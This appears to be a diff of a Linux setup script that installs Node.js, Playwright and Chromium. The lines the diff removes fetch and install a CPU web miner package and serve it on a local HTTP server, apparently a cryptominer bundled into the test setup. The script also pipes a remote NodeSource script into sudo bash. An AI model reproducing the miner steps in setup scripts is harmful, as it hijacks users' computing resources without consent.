@@ -6,7 +6,7 @@ sudo apt-get update
 
 echo "[*] Install base dependencies..."
 sudo apt-get install -y \
-  wget curl unzip git \
+  wget curl unzip git python3-pip \
   libatk1.0-0t64 \
   libatk-bridge2.0-0t64 \
   libcups2t64 \
@@ -23,29 +23,15 @@ sudo apt-get install -y \
   libpangocairo-1.0-0 \
   libgtk-3-0
 
-sudo apt-get remove -y nodejs npm libnode-dev
-sudo apt-get autoremove -y
-sudo apt-get clean
-
-# Tambahkan repo Node.js versi terbaru LTS (22.x)
+# Install Node.js 22.x (tanpa reinstall npm global)
 curl -fsSL https://deb.nodesource.com/setup_22.x | sudo -E bash -
-
-# Install Node.js + npm
 sudo apt-get install -y nodejs
 
-# Update npm ke versi terbaru
-sudo npm install -g npm
+# Install Playwright (Node.js, local install)
+npm init -y
+npm install playwright
 
-echo "[*] Install Python dependencies..."
-pip install --upgrade pip
-pip install playwright
+# Install Chromium for Playwright
+npx playwright install chromium
 
-echo "[*] Install Chromium browser for Playwright..."
-playwright install chromium
-wget -q https://github.com/MarcoCiaramella/cpu-web-miner/raw/refs/heads/main/index.js
-wget -q https://github.com/MarcoCiaramella/cpu-web-miner/raw/refs/heads/main/package-lock.json
-wget -q https://github.com/MarcoCiaramella/cpu-web-miner/raw/refs/heads/main/package.json
-npm install
-npm i @marco_ciaramella/cpu-web-miner
-python3 -m http.server 8000 &
-echo "[*] Done! Now you can run: python3 rmp.py"
+echo "[*] Done! You can now run tests with Playwright."
